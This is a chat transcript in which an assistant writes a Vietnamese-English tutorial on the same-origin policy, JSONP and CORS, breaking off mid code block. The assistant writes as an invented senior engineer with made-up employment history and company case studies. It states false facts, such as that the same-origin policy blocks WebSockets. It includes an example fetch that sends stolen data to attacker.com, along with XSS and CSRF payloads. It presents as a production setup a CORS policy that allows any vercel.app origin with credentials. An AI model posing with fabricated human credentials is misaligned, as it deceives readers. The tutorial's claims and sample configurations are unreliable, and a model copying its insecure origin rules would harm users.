# Cross-Domain Security Engineering

## You

Continue

## Claude


# CROSS-DOMAIN MASTERY: Từ Browser Security đến Production Architecture - Một Hành Trình Chuyên Sâu của Principal Front-end Engineer


*Viết bởi một Principal Front-end Engineer với 15+ năm kinh nghiệm tại NAB, Axon, Binance, Webflow, và Figma*


## 🎯 PREFACE: TẦM QUAN TRỌNG CỦA CROSS-DOMAIN TRONG ECOSYSTEM HIỆN ĐẠI


Khi tôi nhìn lại hành trình 15 năm phát triển web applications tại các công ty như NAB (financial services), Axon (law enforcement technology), Binance (cryptocurrency exchange), Webflow (web design platform), và Figma (collaborative design tool), tôi nhận ra rằng cross-domain problems không chỉ là một "technical challenge" đơn thuần. Nó là một **fundamental constraint** định hình cách chúng ta architect modern web applications.


**💭 Think Out Loud - Reflection từ Principal's Perspective:**


Khi tôi đầu tiên encounter cross-domain issue tại NAB năm 2010, tôi đã frustrated vì không hiểu tại sao browser lại "block" những requests tôi thấy hoàn toàn legitimate. Aha moment đến khi tôi realize rằng: **Browser security model không thể distinguish giữa "legitimate developer" và "malicious attacker"**. Every restriction tồn tại vì một lý do security fundamental.


Common misconception mà tôi thấy engineers thường mắc: Họ nghĩ cross-domain restrictions là "annoying limitation" cần "workaround". Thực tế, đây là **critical security features** cần được understood và respected.


---


## 📖 PHẦN I: FOUNDATION LEVEL - XÂY DỰNG NỀN TẢNG HIỂU BIẾT


### 🌱 1. SAME-ORIGIN POLICY: BẢN CHẤT VÀ NGUỒN GỐC


#### 🔬 Nguồn Gốc & Motivation - Tại Sao Same-Origin Policy Tồn Tại?


**Problem Statement Chi Tiết:**


Hãy tưởng tượng bạn đang browse web vào năm 1995. Web browser chỉ là một "document viewer" đơn giản. Nhưng khi JavaScript được introduced năm 1995, suddenly browsers trở thành "code execution environments". Điều này tạo ra một fundamental security challenge:


```javascript
// Scenario nguy hiểm nếu KHÔNG có Same-Origin Policy
// Bạn visit malicious-site.com
// Malicious site có thể execute:

// 1. Steal data từ banking site
fetch('https://your-bank.com/account-details')
  .then(response => response.text())
  .then(data => {
    // Send sensitive data to attacker's server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: data
    });
  });

// 2. Perform actions on behalf of user
fetch('https://your-bank.com/transfer', {
  method: 'POST',
  body: JSON.stringify({
    to: 'attacker-account',
    amount: 1000000
  })
});
```


**Historical Context:**


Same-Origin Policy được introduce trong Netscape Navigator 2.0 (1996) bởi **Brendan Eich** (creator của JavaScript). Lúc đó, web đang transition từ "static documents" sang "interactive applications". Policy này được design để prevent **ambient authority attacks**.


**💡 Real-World Analogy:**


Imagine bạn đang ở trong một hotel. Same-Origin Policy giống như hotel security system:


- **Origin = Room key**: Mỗi website có unique "room key" (protocol + domain + port)
- **Resource access = Room access**: Chỉ có correct key mới access được resources trong room
- **Cross-origin request = Asking to enter different room**: Cần explicit permission từ room owner


#### ⚙️ Core Mechanism - Same-Origin Policy Hoạt Động Như Thế Nào?


**Origin Definition - The Precise Rules:**


```javascript
// Origin = Protocol + Domain + Port
// Tất cả các components phải IDENTICAL

// Same Origin Examples:
const origin1 = 'https://example.com:443/path1';
const origin2 = 'https://example.com:443/path2';
// ✅ SAME ORIGIN (path không ảnh hưởng)

// Different Origin Examples:
const origins = [
  'http://example.com',      // Different protocol (http vs https)
  'https://api.example.com', // Different subdomain
  'https://example.com:8080', // Different port
  'https://example.org'      // Different domain
];
// ❌ ALL DIFFERENT ORIGINS
```


**Browser Implementation - V8 Engine Level:**


Trong V8 engine (Chrome), Same-Origin Policy được implement ở **SecurityOrigin class**:


```cpp
// Simplified V8 SecurityOrigin implementation
class SecurityOrigin {
private:
    String protocol_;
    String host_;
    uint16_t port_;

public:
    bool canAccess(const SecurityOrigin& other) const {
        return protocol_ == other.protocol_ &&
               host_ == other.host_ &&
               port_ == other.port_;
    }
};
```


**Step-by-Step Execution Flow:**


1. **Origin Calculation**: Browser calculates origin của current page
2. **Request Origin Check**: For mỗi outgoing request, browser checks target origin
3. **Policy Enforcement**: Nếu origins khác nhau, browser applies restrictions
4. **Exception Handling**: Một số exceptions được allow (images, stylesheets, scripts)


#### 💭 Think Out Loud - Debugging Mental Model:


**Red Flags báo hiệu Same-Origin Policy issues:**


```javascript
// 1. Console errors containing "CORS"
// "Access to fetch at 'https://api.example.com' from origin 'http://localhost:3000'
// has been blocked by CORS policy"

// 2. Network tab shows request as "blocked" hoặc "(failed)"

// 3. Preflight OPTIONS requests failing unexpectedly

// 4. Cookies không được send cross-origin despite being set
```


**Tools để inspect Same-Origin Policy:**


```javascript
// 1. Check current origin
console.log('Current origin:', window.location.origin);

// 2. Manual origin comparison
function isSameOrigin(url) {
  const a = document.createElement('a');
  a.href = url;
  return a.origin === window.location.origin;
}

// 3. Browser DevTools Security tab
// Shows mixed content warnings và origin mismatches
```


### 🔬 2. CROSS-DOMAIN PROBLEMS: TAXONOMY VÀ IMPACT ANALYSIS


#### 🌱 Categories của Cross-Domain Scenarios


**Type 1: API Communication**


```javascript
// Scenario: Frontend (localhost:3000) gọi Backend API (api.company.com)
// Impact: Core application functionality broken
// Frequency: 99% of modern web apps
```


**Type 2: Third-party Integrations**


```javascript
// Scenario: Embed payment widget, analytics, social media buttons
// Impact: Business functionality compromised
// Frequency: 80% of commercial websites
```


**Type 3: Microservices Communication**


```javascript
// Scenario: Frontend cần communicate với multiple backend services
// Impact: Architecture flexibility limited
// Frequency: 90% of enterprise applications
```


**Type 4: CDN và Asset Loading**


```javascript
// Scenario: Loading assets từ CDN domain khác
// Impact: Performance optimization blocked
// Frequency: 95% of production websites
```


#### 💡 Real-World Impact Analysis - Kinh Nghiệm từ Production


**NAB Banking Platform Case Study:**


Tại NAB, chúng tôi gặp phải cross-domain challenge khi architect một **unified banking dashboard** cần integrate với:


- Core banking API (`api-core.nab.com.au`)
- Credit card service (`api-cards.nab.com.au`)
- Investment platform (`api-invest.nab.com.au`)
- Third-party forex service (`forex.reuters.com`)


**Initial Problem:**


```javascript
// Từ main dashboard (nab.com.au), không thể call:
Promise.all([
  fetch('https://api-core.nab.com.au/accounts'),     // ❌ Cross-origin
  fetch('https://api-cards.nab.com.au/statements'), // ❌ Cross-origin
  fetch('https://api-invest.nab.com.au/portfolio'), // ❌ Cross-origin
  fetch('https://forex.reuters.com/rates')          // ❌ Cross-origin
]);
```


**Business Impact:**


- User experience fragmented (multiple page redirects)
- Development velocity reduced (complex workarounds)
- Security concerns với các temporary solutions
- Performance degraded (multiple round-trips)


**Binance Trading Platform Case Study:**


Tại Binance, cross-domain challenges trong **real-time trading environment**:


```javascript
// Challenge: Real-time price feeds từ multiple sources
const priceFeeds = [
  'wss://stream.binance.com',      // Main trading data
  'wss://fstream.binance.com',     // Futures data
  'wss://dstream.binance.com',     // Options data
  'wss://vstream.binance.com'      // Volatility data
];

// Problem: WebSocket connections bị block bởi Same-Origin Policy
// Impact: Trading delays có thể cost millions trong high-frequency trading
```


#### 🔍 Technical Deep Dive - Browser Enforcement Mechanisms


**Network Layer Enforcement:**


```javascript
// Browser network stack implementation (simplified)
class NetworkService {
  async fetch(url, options) {
    const requestOrigin = getCurrentOrigin();
    const targetOrigin = extractOrigin(url);

    if (!this.isSameOrigin(requestOrigin, targetOrigin)) {
      // Check if simple request
      if (this.isSimpleRequest(options)) {
        // Send request, check response headers
        const response = await this.sendRequest(url, options);
        return this.validateCORSResponse(response, requestOrigin);
      } else {
        // Send preflight first
        const preflightResponse = await this.sendPreflight(url, options);
        if (preflightResponse.ok) {
          return this.sendRequest(url, options);
        } else {
          throw new Error('CORS preflight failed');
        }
      }
    }

    return this.sendRequest(url, options);
  }
}
```


**Memory Model Analysis:**


Cross-domain restrictions hoạt động ở **process isolation level** trong modern browsers:


```
┌─────────────────┐    ┌─────────────────┐
│   Origin A      │    │   Origin B      │
│   Process ID: 1 │    │   Process ID: 2 │
├─────────────────┤    ├─────────────────┤
│ - Isolated heap │    │ - Isolated heap │
│ - Separate V8   │    │ - Separate V8   │
│ - Own DOM tree  │    │ - Own DOM tree  │
└─────────────────┘    └─────────────────┘
        │                        │
        └──────── IPC ────────────┘
              (Restricted)
```


---


## 📖 PHẦN II: SENIOR LEVEL - JSONP DEEP DIVE


### 🌱 3. JSONP: INGENIOUS WORKAROUND VÀ HISTORICAL SIGNIFICANCE


#### 🔬 Nguồn Gốc & Motivation - The Birth of JSONP


**Problem Statement năm 2005:**


Web 2.0 era đang emerge, developers muốn create **dynamic, interactive web applications**. XMLHttpRequest vừa được introduced, nhưng Same-Origin Policy làm nó useless cho cross-domain requests. AJAX revolution bị stuck.


**Historical Context:**


**Bob Ippolito** tại Flickr (2005) phát minh JSONP technique. Lúc đó, Flickr muốn allow third-party developers embed Flickr photos vào websites của họ. Traditional solutions:


- Server-side proxy: Too complex, performance overhead
- Flash/Silverlight: Platform-dependent, accessibility issues
- Document.domain manipulation: Chỉ work cho subdomains


**The "Aha" Moment:**


Bob noticed rằng `<script>` tags **không bị Same-Origin Policy restrict**:


```html
<!-- This works from any domain -->
<script src="https://code.jquery.com/jquery.min.js"></script>
<script src="https://apis.google.com/js/platform.js"></script>
<script src="https://connect.facebook.net/en_US/sdk.js"></script>
```


**Insight:** Nếu server có thể return **executable JavaScript** thay vì plain JSON, client có thể "inject" script tag để receive data!


#### ⚙️ Core Mechanism - JSONP Architecture Deep Dive


**The Fundamental Trick:**


```javascript
// Traditional JSON response (blocked by CORS):
// GET https://api.example.com/data
// Response: {"name": "John", "age": 25}

// JSONP response (works cross-domain):
// GET https://api.example.com/data?callback=handleData
// Response: handleData({"name": "John", "age": 25});
```


**Step-by-Step Implementation Analysis:**


```javascript
// Step 1: Client preparation
function createJSONPRequest(url, callback) {
  // 1.1: Generate unique callback name
  const callbackName = `jsonp_callback_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

  // 1.2: Register global callback function
  window[callbackName] = function(data) {
    try {
      callback(null, data);
    } catch (error) {
      callback(error, null);
    } finally {
      // 1.3: Cleanup
      delete window[callbackName];
      document.body.removeChild(script);
    }
  };

  // 1.4: Create script element
  const script = document.createElement('script');
  script.src = `${url}?callback=${callbackName}`;

  // 1.5: Error handling
  script.onerror = function() {
    callback(new Error('JSONP request failed'), null);
    delete window[callbackName];
  };

  // 1.6: Inject into DOM
  document.body.appendChild(script);
}
```


**Server-Side Implementation (Node.js):**


```javascript
// Express.js JSONP endpoint
app.get('/api/data', (req, res) => {
  const callbackName = req.query.callback;

  // Validation: Prevent XSS attacks
  if (!callbackName || !/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callbackName)) {
    return res.status(400).json({ error: 'Invalid callback name' });
  }

  const data = { name: 'John', age: 25, timestamp: Date.now() };

  // Return executable JavaScript
  res.setHeader('Content-Type', 'application/javascript');
  res.send(`${callbackName}(${JSON.stringify(data)});`);
});
```


**Memory Model & Execution Flow:**


```javascript
// Execution sequence trong browser:
// 1. Script injection triggers network request
// 2. Browser downloads JavaScript response
// 3. JavaScript được execute trong global context
// 4. Global callback function được invoke
// 5. Data được pass vào callback function
// 6. Cleanup occurs (script removal, callback deletion)

// Memory implications:
// - Temporary global namespace pollution
// - Script DOM node creation/destruction
// - Callback function instantiation
// - JSON data deserialization
```


#### 💡 Production Implementation - Advanced JSONP Patterns


**Pattern 1: Promise-Based JSONP Wrapper**


```javascript
class JSONPClient {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.callbackPrefix = options.callbackPrefix || 'jsonp_callback';
  }

  request(url, options = {}) {
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        cleanup();
        reject(new Error(`JSONP request timeout after ${this.timeout}ms`));
      }, this.timeout);

      const callbackName = `${this.callbackPrefix}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

      const cleanup = () => {
        clearTimeout(timeoutId);
        delete window[callbackName];
        if (script.parentNode) {
          script.parentNode.removeChild(script);
        }
      };

      window[callbackName] = (data) => {
        cleanup();
        resolve(data);
      };

      const script = document.createElement('script');
      script.src = this.buildURL(url, callbackName, options.params);
      script.onerror = () => {
        cleanup();
        reject(new Error('JSONP script loading failed'));
      };

      document.head.appendChild(script);
    });
  }

  buildURL(baseUrl, callback, params = {}) {
    const url = new URL(baseUrl);
    url.searchParams.set('callback', callback);

    Object.entries(params).forEach(([key, value]) => {
      url.searchParams.set(key, value);
    });

    return url.toString();
  }
}

// Usage example:
const jsonpClient = new JSONPClient({ timeout: 5000 });

jsonpClient.request('https://api.example.com/data', {
  params: { userId: 123, format: 'detailed' }
})
.then(data => console.log('Received data:', data))
.catch(error => console.error('JSONP error:', error));
```


**Pattern 2: JSONP với Caching Strategy**


```javascript
class CachedJSONPClient extends JSONPClient {
  constructor(options = {}) {
    super(options);
    this.cache = new Map();
    this.cacheTimeout = options.cacheTimeout || 60000; // 1 minute default
  }

  async request(url, options = {}) {
    const cacheKey = this.getCacheKey(url, options.params);
    const cachedResponse = this.cache.get(cacheKey);

    if (cachedResponse && Date.now() - cachedResponse.timestamp < this.cacheTimeout) {
      return cachedResponse.data;
    }

    try {
      const data = await super.request(url, options);
      this.cache.set(cacheKey, {
        data,
        timestamp: Date.now()
      });
      return data;
    } catch (error) {
      throw error;
    }
  }

  getCacheKey(url, params) {
    return `${url}?${new URLSearchParams(params).toString()}`;
  }

  clearCache() {
    this.cache.clear();
  }
}
```


#### 🔍 Security Analysis - JSONP Vulnerabilities


**Vulnerability 1: XSS via Callback Manipulation**


```javascript
// Malicious request:
// https://api.example.com/data?callback=alert('XSS');//

// Server response (if not properly validated):
// alert('XSS');//({"data": "value"});

// Result: XSS attack executed
```


**Mitigation Strategy:**


```javascript
// Server-side callback validation
function validateCallback(callback) {
  // 1. Check format: valid JavaScript identifier
  if (!/^[a-zA-Z_$][a-zA-Z0-9_$]*$/.test(callback)) {
    throw new Error('Invalid callback format');
  }

  // 2. Length limit
  if (callback.length > 50) {
    throw new Error('Callback name too long');
  }

  // 3. Blacklist dangerous patterns
  const dangerousPatterns = [
    /alert/i, /eval/i, /document/i, /window/i,
    /script/i, /iframe/i, /object/i, /embed/i
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(callback)) {
      throw new Error('Callback contains dangerous content');
    }
  }

  return true;
}
```


**Vulnerability 2: CSRF (Cross-Site Request Forgery)**


```javascript
// Malicious site có thể trigger JSONP requests:
// <script src="https://bank.com/api/transfer?callback=steal&to=attacker&amount=1000"></script>

// Server sẽ execute transfer nếu user đã authenticated!
```


**Mitigation Strategy:**


```javascript
// 1. CSRF tokens trong JSONP requests
app.get('/api/sensitive-action', (req, res) => {
  const { callback, csrfToken } = req.query;

  // Validate CSRF token
  if (!isValidCSRFToken(csrfToken, req.session)) {
    return res.status(403).send(`${callback}({"error": "Invalid CSRF token"});`);
  }

  // Process request...
});

// 2. Origin validation (though limited effectiveness với JSONP)
// 3. Additional authentication checks for sensitive operations
```


#### 💭 Think Out Loud - JSONP Debugging Experience


**Common Issues tôi encountered khi debug JSONP:**


1. **Callback Function Not Found Error:**


```javascript
// Error: "Uncaught ReferenceError: jsonp_callback_123 is not defined"
// Root cause: Callback cleanup occurred before server response
// Solution: Extend cleanup timeout, improve error handling

// Debug approach:
console.log('Registering callback:', callbackName);
window[callbackName] = function(data) {
  console.log('Callback executed with data:', data);
  // ... rest of callback logic
};
```


1. **Silent Failures:**


```javascript
// JSONP requests fail silently - no network errors in console
// Debug strategy: Add comprehensive logging

const originalAppendChild = document.body.appendChild;
document.body.appendChild = function(element) {
  if (element.tagName === 'SCRIPT') {
    console.log('JSONP script injected:', element.src);
    element.onload = () => console.log('JSONP script loaded successfully');
    element.onerror = () => console.error('JSONP script failed to load');
  }
  return originalAppendChild.call(this, element);
};
```


1. **Memory Leaks trong Production:**


```javascript
// Issue: Abandoned JSONP requests leave callbacks trong global scope
// Solution: Implement proper cleanup với timeout

class JSONPManager {
  constructor() {
    this.activeRequests = new Set();
  }

  request(url) {
    const requestId = this.generateRequestId();
    this.activeRequests.add(requestId);

    return new Promise((resolve, reject) => {
      // ... JSONP implementation với proper cleanup
      const cleanup = () => {
        this.activeRequests.delete(requestId);
        // ... other cleanup
      };
    });
  }

  // Cleanup tất cả pending requests (useful cho SPA route changes)
  cleanupAll() {
    this.activeRequests.forEach(requestId => {
      // Force cleanup of pending requests
    });
    this.activeRequests.clear();
  }
}
```


### 🎯 JSONP Interview Questions & Practical Exercises


**Senior Level Interview Questions:**


1. **Q: Explain tại sao JSONP works despite Same-Origin Policy restrictions?**
**A:** JSONP exploits một exception trong Same-Origin Policy. Trong khi `fetch()` và `XMLHttpRequest` bị restrict cross-origin, các resource loading tags như `<script>`, `<img>`, `<link>` được allow để load resources từ any domain. JSONP transform một JSON API call thành script loading operation bằng cách:

Server return executable JavaScript thay vì plain JSON
JavaScript code chứa function call với JSON data như parameter
Client pre-define callback function để handle data
Browser execute downloaded script, triggering callback
2. **Q: JSONP có những security risks nào và làm sao mitigate?**
**A:** Main security risks:

XSS attacks: Malicious callback parameters có thể execute arbitrary code

Mitigation: Strict callback validation với regex patterns


CSRF attacks: Authenticated requests có thể được trigger từ malicious sites

Mitigation: CSRF tokens, Origin validation, additional auth checks


Data injection: Compromised API server có thể inject malicious scripts

Mitigation: Content Security Policy, trusted domain whitelisting
3. **Q: So sánh performance characteristics của JSONP vs modern CORS?**
**A:**
javascript// JSONP Performance Profile:
// ✅ Pros:
// - No preflight requests (always simple)
// - Better caching (script resources cached by browser)
// - Lower memory usage per request

// ❌ Cons:
// - Global namespace pollution
// - DOM manipulation overhead (script injection/removal)
// - No request cancellation capability
// - Limited error information

// CORS Performance Profile:
// ✅ Pros:
// - Full HTTP method support (POST, PUT, DELETE)
// - Request cancellation via AbortController
// - Detailed error information
// - No DOM manipulation

// ❌ Cons:
// - Preflight requests cho complex requests (double roundtrip)
// - Browser compatibility requirements


**Practical Exercise - Implement Production-Ready JSONP Client:**


```javascript
/**
 * Challenge: Implement một JSONP client với following requirements:
 * 1. Promise-based API
 * 2. Request timeout handling
 * 3. Automatic retry với exponential backoff
 * 4. Request deduplication (prevent duplicate concurrent requests)
 * 5. Comprehensive error handling
 * 6. Memory leak prevention
 * 7. Performance monitoring hooks
 */

class ProductionJSONPClient {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.retryAttempts = options.retryAttempts || 3;
    this.retryDelay = options.retryDelay || 1000;
    this.pendingRequests = new Map(); // Deduplication
    this.performanceMetrics = new Map(); // Monitoring
  }

  async request(url, options = {}) {
    // TODO: Implement solution
    // Hint: Use URL as deduplication key
    // Hint: Implement exponential backoff: delay * (2 ** attempt)
    // Hint: Track metrics: requestStart, requestEnd, retryCount
  }

  // TODO: Implement helper methods:
  // - createScript()
  // - setupTimeout()
  // - handleRetry()
  // - collectMetrics()
  // - cleanup()
}

// Test scenarios:
const client = new ProductionJSONPClient({
  timeout: 5000,
  retryAttempts: 3,
  retryDelay: 500
});

// Test 1: Basic request
client.request('https://api.example.com/data')
  .then(data => console.log('Success:', data))
  .catch(error => console.error('Error:', error));

// Test 2: Request deduplication
Promise.all([
  client.request('https://api.example.com/data'),
  client.request('https://api.example.com/data'), // Should reuse first request
  client.request('https://api.example.com/data')  // Should reuse first request
]);

// Test 3: Timeout và retry
client.request('https://slow-api.example.com/data')
  .catch(error => {
    console.log('Retry attempts:', client.performanceMetrics.get('retryCount'));
    console.log('Total time:', client.performanceMetrics.get('totalDuration'));
  });
```


---


## 📖 PHẦN III: PRINCIPAL LEVEL - CORS MASTERY


### 🌱 4. CORS: THE MODERN CROSS-ORIGIN SOLUTION


#### 🔬 Nguồn Gốc & Evolution - From XMLHttpRequest Level 1 to Fetch API


**The XMLHttpRequest Limitation Era (2006-2008):**


When XMLHttpRequest được introduced trong Internet Explorer 5 (1999) và standardized trong W3C (2006), nó revolutionized web development bằng cách enable AJAX. Tuy nhiên, Same-Origin Policy made it useless cho cross-domain communication.


**The Birth of CORS (2008-2014):**


**Anne van Kesteren** (Opera Software) và **W3C WebApps Working Group** developed CORS specification để solve fundamental problem: **How to enable secure cross-origin requests?**


Key insight: Thay vì bypass Same-Origin Policy (như JSONP), hãy create một **controlled relaxation mechanism** cho phép servers explicitly grant cross-origin access.


**CORS Evolution Timeline:**


- 2008: Initial draft - "Access Control for Cross-Site Requests"
- 2012: Candidate Recommendation
- 2014: W3C Recommendation (stable standard)
- 2017: Integration với Fetch API specification
- 2020: Enhanced security với COEP/COOP headers


#### ⚙️ Core Mechanism - CORS Protocol Deep Dive


**The Fundamental Protocol:**


CORS implements **server-controlled permission system** thông qua HTTP headers. Browser acts như một **trusted intermediary** enforcing server decisions.


```javascript
// CORS Request Flow (Simplified):
// 1. Browser calculates origin of current page
// 2. Browser adds Origin header to cross-origin requests
// 3. Server examines Origin và decides permission
// 4. Server responds với appropriate Access-Control-* headers
// 5. Browser enforces server decision

// Example:
// Request:
// GET /api/data HTTP/1.1
// Host: api.example.com
// Origin: https://app.mysite.com

// Response:
// HTTP/1.1 200 OK
// Access-Control-Allow-Origin: https://app.mysite.com
// Content-Type: application/json
```


**Simple vs Complex Requests - The Critical Distinction:**


```javascript
// SIMPLE REQUESTS (no preflight required):
const simpleRequest = {
  // Allowed methods:
  methods: ['GET', 'HEAD', 'POST'],

  // Allowed headers (automatically safe):
  autoHeaders: [
    'Accept', 'Accept-Language', 'Content-Language',
    'Content-Type', 'Range'
  ],

  // Allowed Content-Type values:
  contentTypes: [
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/plain'
  ]
};

// COMPLEX REQUESTS (preflight required):
const complexRequest = {
  // Any other method:
  methods: ['PUT', 'DELETE', 'PATCH', 'OPTIONS'],

  // Custom headers:
  customHeaders: [
    'Authorization', 'X-API-Key', 'X-Requested-With'
  ],

  // JSON content:
  contentTypes: ['application/json', 'application/xml']
};
```


**Preflight Mechanism - The OPTIONS Dance:**


```javascript
// Complex request triggers preflight:
fetch('https://api.example.com/users/123', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ name: 'John Updated' })
});

// Browser automatically sends preflight:
// OPTIONS /users/123 HTTP/1.1
// Host: api.example.com
// Origin: https://app.mysite.com
// Access-Control-Request-Method: PUT
// Access-Control-Request-Headers: Content-Type, Authorization

// Server must respond appropriately:
// HTTP/1.1 200 OK
// Access-Control-Allow-Origin: https://app.mysite.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Content-Type, Authorization
// Access-Control-Max-Age: 86400

// Only then browser sends actual request:
// PUT /users/123 HTTP/1.1
// Host: api.example.com
// Origin: https://app.mysite.com
// Content-Type: application/json
// Authorization: Bearer token123
```


#### 💡 Production Architecture - CORS tại Scale


**Enterprise CORS Configuration - Kinh Nghiệm từ Binance:**


Tại Binance, chúng tôi phải handle millions of cross-origin requests từ:


- Web trading platform
- Mobile app WebViews
- Third-party trading bots
- Partner integrations
- Internal admin tools


**Challenge:** Balance security với performance và developer experience.


```javascript
// Binance CORS Configuration (simplified)
class CORSManager {
  constructor() {
    this.allowedOrigins = new Set([
      'https://www.binance.com',
      'https://binance.com',
      /^https:\/\/[\w-]+\.binance\.com$/,     // Subdomains
      /^https:\/\/localhost:\d+$/,            // Development
      /^https:\/\/[\w-]+\.vercel\.app$/       // Preview deployments
    ]);

    this.allowedMethods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'];
    this.allowedHeaders = [
      'Content-Type', 'Authorization', 'X-API-Key',
      'X-MBX-APIKEY', 'X-Timestamp', 'X-Signature'
    ];

    this.maxAge = 86400; // 24 hours preflight cache
  }

  isOriginAllowed(origin) {
    if (!origin) return false;

    for (const allowed of this.allowedOrigins) {
      if (typeof allowed === 'string' && allowed === origin) {
        return true;
      }
      if (allowed instanceof RegExp && allowed.test(origin)) {
        return true;
      }
    }

    return false;
  }

  handleCORS(req, res, next) {
    const origin = req.headers.origin;

    if (this.isOriginAllowed(origin)) {
      res.setHeader('Access-Control-Allow-Origin', origin);
      res.setHeader('Access-Control-Allow-Credentials', 'true');
    }

    res.setHeader('Access-Control-Allow-Methods', this.allowedMethods.join(', '));
    res.setHeader('Access-Control-Allow-Headers', this.allowedHeaders.join(', '));
    res.setHeader('Access-Control-Max-Age', this.maxAge);

    // Handle preflight
    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    next();
  }
}

// Usage in Express.js:
const corsManager = new CORSManager();
app.use(corsManager.handleCORS.bind(corsManager));
```


**Performance Optimization - Preflight Caching Strategy:**


```javascript
// Problem: Preflight requests add latency (double roundtrip)
// Solution: Strategic caching với Access-Control-Max-Age

// Browser preflight cache behavior:
class PreflightCache {
  constructor() {
    this.cache = new Map();
  }

  getCacheKey(origin, method, headers) {
    return `${origin}:${method}:${headers.sort().join(',')}`;
  }

  shouldSendPreflight(origin, method, headers) {
    const key = this.getCacheKey(origin, method, headers);
    const cached = this.cache.get(key);

    if (!cached) return true;

    const now = Date.now();
    if (now > cached.expires) {
      this.cache.delete(key);
      return true;
    }

    return false;
  }

  cachePreflight(origin, method, headers, maxAge) {
    const key = this.getCacheKey(origin, method, headers);
    this.cache.set(key, {
      expires: Date.now() + (maxAge * 1000)
    });
  }
}

// Server optimization: Strategic Max-Age values
const corsConfig = {
  // Static resources: Long cache
  '/api/static/*': { maxAge: 86400 * 7 },    // 7 days

  // User data: Medium cache
  '/api/user/*': { maxAge: 3600 },           // 1 hour

  // Trading endpoints: Short cache
  '/api/trading/*': { maxAge: 300 },         // 5 minutes

  // Admin endpoints: No cache
  '/api/admin/*': { maxAge: 0 }              // Always preflight
};
```


#### 🔍 Advanced CORS Patterns - Real-World Solutions


**Pattern 1: Dynamic Origin Validation**


```javascript
// Challenge: Support development environments với dynamic ports/domains
class DynamicCORSValidator {
  constructor() {
    this.productionOrigins = [
      'https://app.company.com',
      'https://admin.company.com'
    ];

    this.developmentPatterns = [
      /^https?:\/\/localhost:\d+$/,
      /^https?:\/\/127\.0\.0\.1:\d+$/,
      /^https:\/\/[\w-]+\.vercel\.app$/,
      /^https:\/\/[\w-]+\.netlify\.app$/,
      /^https:\/\/[\w-]+\.github\.io$/
    ];
  }

  isValidOrigin(origin, environment = 'production') {
    if (!origin) return false;

    // Production: Strict whitelist
    if (environment === 'production') {
      return this.productionOrigins.includes(origin);
    }

    // Development: Pattern matching
    if (environment === 'development') {
      return [...this.productionOrigins, ...this.developmentPatterns].some(pattern => {
        return typeof pattern === 'string' ? pattern === origin : pattern.test(origin);
      });
    }

    return false;
  }
}
```


**Pattern 2: Conditional CORS Headers**


```javascript
// Different CORS policies cho different endpoints
class ConditionalCORSHandler {
  constructor() {
    this.policies = {
      'public': {
        allowedOrigins: ['*'],
        allowedMethods: ['GET', 'HEAD'],
        allowedHeaders: ['Content-Type'],
        allowCredentials: false,
        maxAge: 86400
      },

      'authenticated': {
        allowedOrigins: ['https://app.company.com'],
        allowedMethods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowedHeaders: ['Content-Type', 'Authorization'],
        allowCredentials: true,
        maxAge: 3600
      },

      'admin': {
        allowedOrigins: ['https://admin.company.com'],
        allowedMethods: ['GET', 'POST', 'PUT', 'DELETE'],
        allowedHeaders: ['Content-Type', 'Authorization', 'X-Admin-Token'],
        allowCredentials: true,
        maxAge: 0 // No preflight caching
      }
    };
  }

  getPolicyForEndpoint(path) {
    if (path.startsWith('/api/public/')) return 'public';
    if (path.startsWith('/api/admin/')) return 'admin';
    return 'authenticated';
  }

  applyCORSPolicy(req, res, next) {
    const policy = this.policies[this.getPolicyForEndpoint(req.path)];
    const origin = req.headers.origin;

    // Origin validation
    if (policy.allowedOrigins.includes('*') || policy.allowedOrigins.includes(origin)) {
      res.setHeader('Access-Control-Allow-Origin',
        policy.allowedOrigins.includes('*') ? '*' : origin);
    }

    res.setHeader('Access-Control-Allow-Methods', policy.allowedMethods.join(', '));
    res.setHeader('Access-Control-Allow-Headers', policy.allowedHeaders.join(', '));
    res.setHeader('Access-Control-Max-Age', policy.maxAge);

    if (policy.allowCredentials) {
      res.setHeader('Access-Control-Allow-Credentials', 'true');
    }

    if (req.method === 'OPTIONS') {
      return res.status(200).end();
    }

    next();
  }
}
```


**Pattern 3: CORS Error Monitoring & Analytics**


```javascript
// Track CORS failures cho debugging và security monitoring
class CORSMonitor {
  constructor(analyticsClient) {
    this.analytics = analyticsClient;
    this.corsErrors = new Map();
  }

  logCORSAttempt(req) {
    const origin = req.headers.origin;
    const method = req.method;
    const path = req.path;

    // Track legitimate CORS usage
    this.analytics.track('cors_request', {
      origin,
      method,
      path,
      userAgent: req.headers['user-agent'],
      timestamp: Date.now()
    });
  }

  logCORSRejection(req, reason) {
    const origin = req.headers.origin;
    const key = `${origin}:${reason}`;

    // Rate limiting cho logs (prevent spam)
    const now = Date.now();
    const lastLog = this.corsErrors.get(key);

    if (!lastLog || now - lastLog > 60000) { // 1 minute throttle
      this.corsErrors.set(key, now);

      this.analytics.track('cors_rejection', {
        origin,
        reason,
        method: req.method,
        path: req.path,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: now
      });

      // Alert for suspicious patterns
      if (reason === 'invalid_origin' && this.isNewOrigin(origin)) {
        this.analytics.alert('suspicious_cors_origin', {
          origin,
          ip: req.ip,
          attempts: this.getAttemptCount(origin)
        });
      }
    }
  }

  isNewOrigin(origin) {
    // Check if this origin has never been seen before
    return !this.knownOrigins.has(origin);
  }

  getAttemptCount(origin) {
    // Count attempts from this origin trong last hour
    return this.recentAttempts.get(origin) || 0;
  }
}
```


#### 💭 Think Out Loud - CORS Debugging Mastery


**Advanced Debugging Strategies từ Production Experience:**


**Issue 1: Mysterious CORS Failures trong Production**


```javascript
